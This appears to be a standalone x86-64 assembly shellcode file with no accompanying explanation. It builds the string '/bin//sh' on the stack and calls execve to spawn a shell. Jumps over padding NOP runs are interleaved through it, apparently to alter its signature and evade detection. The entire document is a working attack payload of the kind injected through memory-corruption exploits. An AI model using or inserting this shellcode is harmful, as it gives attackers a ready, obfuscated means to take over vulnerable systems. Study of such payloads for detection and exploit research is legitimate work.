section .text
    global _start

_start:

    xor rdx, rdx
    push rdx
    push dword 0x6e69622f
    jmp $+7 
    nop
    nop
    nop
    nop
    nop
    mov dword [rsp+4], 0x68732f2f
    jmp $+8
    nop
    nop
    nop
    nop
    nop
    nop
    pop rax
    push rax
    mov rdi, rsp
    push rdx
    push rdi
    jmp $+9
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov rsi, rsp
    xor rax, rax
    mov al, 0x3b
    jmp $+8
    nop
    nop
    nop
    nop
    nop
    nop
    syscall